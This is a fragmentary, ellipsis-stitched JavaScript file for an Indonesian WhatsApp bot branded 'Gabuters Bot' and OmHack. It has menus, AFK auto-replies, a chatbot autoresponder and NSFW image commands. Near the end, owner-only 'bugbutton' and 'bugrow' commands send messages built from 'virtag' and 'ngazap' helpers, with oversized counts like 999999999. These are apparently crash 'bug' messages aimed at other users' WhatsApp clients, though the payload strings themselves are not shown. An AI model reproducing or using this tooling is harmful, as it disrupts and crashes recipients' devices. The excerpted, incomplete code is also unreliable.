...
virgam = fs.readFileSync(`./media/virus.jpg`)
...
offline = false
publik = true
waktuafk = 'Tidak diketahui'
alasanafk = 'Tidak diketahui'
...
const addafk = (from) => {
    const obj = { id: from, expired: Date.now() + toMs('1ms') }
    afk.push(obj)
...
try {
		...
		const dfrply = fs.readFileSync('./media/omhack.jpg')
		cmhit.push(command)
        mess = {
			wait: 'Sabar ya mohon ditunggu',
		...
		const katalog = (teks) => {
             res = pemuda.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© Gabuters Bot_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
             pemuda.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = pemuda.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `${NamaBot}`, "footerText": "*_© Gabuters Bot_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
...
pemuda.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 ...
 if (!mek.key.remoteJid.endsWith('@g.us') && offline){
		  ...
		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© Gabuters Bot_*", [{
		  buttonId: 'simi',
		  buttonText: {displayText: 'Oke'},
		  type: 1}],{quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
		  }
			...
			if (!mek.key.fromMe){
				...
				for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
					if (ment === pemuda.user.jid){
                        ...
                        addafk(mek.key.remoteJid)
						heheh = ms(Date.now() - waktuafk)
			       sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© Gabuters Bot_*", [{buttonId: 'h', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
				}
						}
					}
...
if (!isGroup && !isCmd && !command && !mek.key.fromMe && autorespon) {
	...
	simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
                     sami = simi.success
                        pemuda.sendMessage(from, `${sami}`, text, {thumbnail: ofrply, sendEphemeral: true, quoted:mek, contextInfo : {forwardingScore: 508, isForwarded: true}})
                      }
...
pemuda.updatePresence(from, Presence.recording)
   ...
   const sotoy = [
     ...
     case "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf":
        ...
        case 'menu':
        case 'help':
        ptod = "6285877569515@s.whatsapp.net"
        stod = `${sender}`
        uwu = '```'
...
└─────────────────⬣
${uwu}`
pemuda.sendMessage(from, menu, text, { quoted: ftrol, thumbnail: fs.readFileSync('./media/omhack.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"",mediaType:"2",thumbnail:ofrply,mediaUrl:`https%3A%2F%2Fyoutube.com%2Fchannel%2FUCHR87YFwIw4T3JMa2zQLG1w`}}})
break
case 'command':
 listMsg = {
 buttonText: 'LIST MENU',
 footerText: '*_© Gabuters Bot_*',
...
pemuda.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./media/omhack.jpg')})
break
case 'anal':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
...
pemuda.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./media/omhack.jpg')})
break
case 'lesbian':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
...
pemuda.sendMessage(from, hai, image, { quoted: mek, thumbnail: fs.readFileSync('./media/omhack.jpg')})
break
case 'wallpaper':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
...
pemuda.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./media/omhack.jpg')})
break
case  'blowjob':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
...
pemuda.sendMessage(from, img, image, { quoted: mek, thumbnail: fs.readFileSync('./media/omhack.jpg')})
break
case 'waifu':
reply(mess.wait)
...
case 'maker2d2': 
					...
					pemuda.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/omhack.jpg')})
					break
		case 'maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} OmHack`)
					makell = args.join(" ")
					reply(mess.wait)
...
client.browserDescription = ['OmHack','Desktop','3.0']
...
client.on ('open', async () => {
  ...
  fs.writeFileSync(`./cache/${sender}.json`, JSON.stringify(authInfo  ,null, '\t'))
...
try {
reply('Oke')
fs.unlinkSync(`./cache/${sender}.json`)
client.close()
} catch {
reply('Oke')
client.close()
...
break
		...
		case 'sc':
		case 'sourcecode':
		pemuda.sendMessage(from, { text: "https://youtube.com/channel/UCHR87YFwIw4T3JMa2zQLG1w", matchedText: 'https://youtube.com/channel/UCHR87YFwIw4T3JMa2zQLG1w', description: "", title: "Jangan lupa subscribe ya kak❤️ !!!", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
       case 'debug':
    ...
    "hydratedButtons": [
      {
        "urlButton": {
          ...
          "url": "https://github.com/ClayHackerTeam"
        },
        "index": 0
      }
    ]
...
Menantang [@${er2.split('@')[0]}] untuk menjadi lawan Game🔥
...
"descriptionCount": "999999999",
  ...
  break
    ...
    hmm4 = fs.readFileSync(`./media/omhack.jpg`)
imeu = await pemuda.prepareMessage('0@s.whatsapp.net', hmm4, image)
...
case 'x':
            ...
            "externalAdReply": {
                ...
                "thumbnail": fs.readFileSync(`./media/omhack.jpg`),
                "sourceUrl": "https://youtu.be/vhUQGd_HDEw"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        pemuda.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{disText:'OmHack'},type:1}])
        pemuda.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
